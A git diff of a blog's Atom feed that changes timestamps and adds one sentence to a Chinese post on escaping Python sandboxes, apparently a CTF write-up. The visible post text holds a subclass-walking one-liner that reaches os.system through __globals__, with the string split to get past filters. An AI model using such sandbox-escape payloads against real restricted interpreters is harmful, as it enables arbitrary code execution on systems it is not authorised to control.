@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-10-22T14:18:25.451Z</updated>
+  <updated>2017-10-22T14:48:57.354Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://yoursite.com/2017/10/22/Python-SandBox-Bypass/"/>
     <id>http://yoursite.com/2017/10/22/Python-SandBox-Bypass/</id>
     <published>2017-10-22T13:11:15.000Z</published>
-    <updated>2017-10-22T14:18:25.451Z</updated>
+    <updated>2017-10-22T14:48:57.354Z</updated>
     
     <content type="html"><![CDATA[<h4 id="0x00-shell执行函数"><a href="#0x00-shell执行函数" class="headerlink" title="0x00 shell执行函数"></a>0x00 shell执行函数</h4><pre><code>os.system(&apos;whoami&apos;)
 os.popen(&apos;whoami&apos;).read()
@@ -96,6 +96,7 @@ while 1:
 </code></pre><p>合成一句就是:</p>
 <pre><code>[c for c in [].__class__.__base__.__subclasses__() if c.__name__ == [m.__name__ for m in [i for i in [].__class__.__base__.__subclasses__() if &apos;&lt;class&apos; in str(i) and &apos;__globals__&apos; in dir(i.__init__)] if &apos;system&apos; in [n for n in m.__init__.__globals__.keys()]][0]][0].__init__.__globals__[&apos;sy&apos;+&apos;stem&apos;](&apos;whoami&apos;)
 </code></pre><p>可读性比较差了…</p>
+<p>这里这个这道题我是用sys先读出了他的python版本号(因为也删除了<code>str()</code>),再用对应的内置对象getshell.</p>
 <h4 id="0x03-links"><a href="#0x03-links" class="headerlink" title="0x03 links"></a>0x03 links</h4><pre><code>http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates
 http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html
 </code></pre>]]></content>
